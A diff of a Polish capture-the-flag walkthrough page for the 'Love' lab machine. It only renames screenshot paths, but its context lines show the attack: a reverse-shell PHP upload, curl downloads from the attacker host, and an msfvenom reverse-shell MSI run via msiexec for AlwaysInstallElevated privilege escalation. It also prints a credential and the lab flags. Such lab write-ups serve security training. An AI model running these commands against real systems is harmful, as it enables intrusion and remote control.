@@ -368,7 +368,7 @@ by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:
 2021/07/29 12:58:00 Finished
 <span style="color:#f92672">===============================================================</span>
 </code></pre></div><p>Strona admin.php</p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210729112342.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210729112342.png" alt=""  />
 </p>
 <hr>
 <h2 id="użytkownicy">Użytkownicy:<a hidden class="anchor" aria-hidden="true" href="#użytkownicy">#</a></h2>
@@ -442,10 +442,10 @@ Table: admin
 <p>Staging.love.htb wyraźnie wskazuje, że należy to dodać do /etc/hosts</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>staging.love.htb/organizationName<span style="color:#f92672">=</span>ValentineCorp/stateOrProvinceName<span style="color:#f92672">=</span>m/countryName<span style="color:#f92672">=</span>in
 </code></pre></div><p>Otwiera się taka strona</p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210729174223.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210729174223.png" alt=""  />
 </p>
 <p>Inna podstrona beta.php</p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210729174356.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210729174356.png" alt=""  />
 </p>
 <hr>
 <h3 id="gobuster-z-staginglovehtb">GoBuster z staging.love.htb<a hidden class="anchor" aria-hidden="true" href="#gobuster-z-staginglovehtb">#</a></h3>
@@ -471,11 +471,11 @@ by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:
 2021/07/29 12:55:16 Finished
 <span style="color:#f92672">===============================================================</span>
 </code></pre></div><p><code>Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27 Server at 127.0.0.1 Port 80</code></p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210729221709.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210729221709.png" alt=""  />
 </p>
 <p><code>admin:@LoveIsInTheAir!!!!</code></p>
 <p>Upload reverse-shell.php bezpośrednio i uruchomienie z images/reverse-shell.php</p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210729223156.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210729223156.png" alt=""  />
 </p>
 <p>user.txt</p>
 <p><code>581d87311b06e6a213fd06fd4e473a48</code></p>
@@ -483,14 +483,14 @@ by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl.exe --output win.exe --url http://10.10.14.63/winPEASx64.exe 
 </code></pre></div><h2 id="podatność">Podatność:<a hidden class="anchor" aria-hidden="true" href="#podatność">#</a></h2>
 <p>AlwaysInstallElevated</p>
-<p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210730004921.png" alt=""  />
+<p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210730004921.png" alt=""  />
 </p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.63 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">1337</span> --encoder x64/xor --iterations <span style="color:#ae81ff">9</span> --format msi --out exploit.msi
 </code></pre></div><p>Exploit.msi zostaje przesłany na Windowsa.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl.exe --output exploit.msi --url http://10.10.14.63/exploit.msi
 </code></pre></div><p>A następnie uruchomiony, podczas gdy na hoście jest nasłuchiwanie na porcie 1337</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msiexec /quiet /qn /i exploit.msi
-</code></pre></div><p><img loading="lazy" src="../../../Screenshots/Pasted%20image%2020210730004650.png" alt=""  />
+</code></pre></div><p><img loading="lazy" src="../../../screenshots/Pasted%20image%2020210730004650.png" alt=""  />
 </p>
 <p>root.txt</p>
 <p><code>e95f6b15eefefdd4b544cfb6175bf08f</code></p>
